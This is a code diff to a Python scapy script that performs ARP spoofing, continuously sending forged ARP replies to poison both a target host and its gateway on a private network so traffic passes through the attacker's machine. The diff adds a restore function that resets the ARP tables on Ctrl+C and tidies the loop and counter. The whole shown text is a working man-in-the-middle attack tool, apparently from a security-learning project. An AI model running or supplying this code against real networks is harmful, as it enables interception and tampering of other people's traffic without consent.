@@ -26,11 +26,25 @@ def spoof(targetip,sourceip):
     #Add verbose=false to stop printing default statements to the screen
     scapy.send(packet, verbose=False)
 
+def restore(destip, sourceip):
+    destMac = getMac(destip)
+    sourceMac = getMac(sourceip)
+    packet = scapy.ARP(op=2, pdst=destip, hwdst=destMac, psrc=sourceip, hwsrc=sourceMac)
+    scapy.send(packet, verbose=False)
+
+targetip = "192.168.31.19"
+gatewayip = "192.168.31.1"
 packets = 0
-while True:
-    packets = packets+1
-    spoof("192.168.31.19", "192.168.31.1")
-    spoof("192.168.31.1", "192.168.31.19")
-    print("[+] Packets sent: " + str(packets))
-    time.sleep(2)
+
+try:
+    while True:
+        packets = packets+2
+        spoof(targetip, gatewayip)
+        spoof(gatewayip, targetip)
+        print("\r[+] Packets sent: " + str(packets), end="")
+        time.sleep(2)
+except KeyboardInterrupt: 
+    print("\n[+] Detected ctrl+c... Remapping the ARP tables please wait..")
+    restore(targetip, gatewayip)
+    restore(gatewayip, targetip)
 
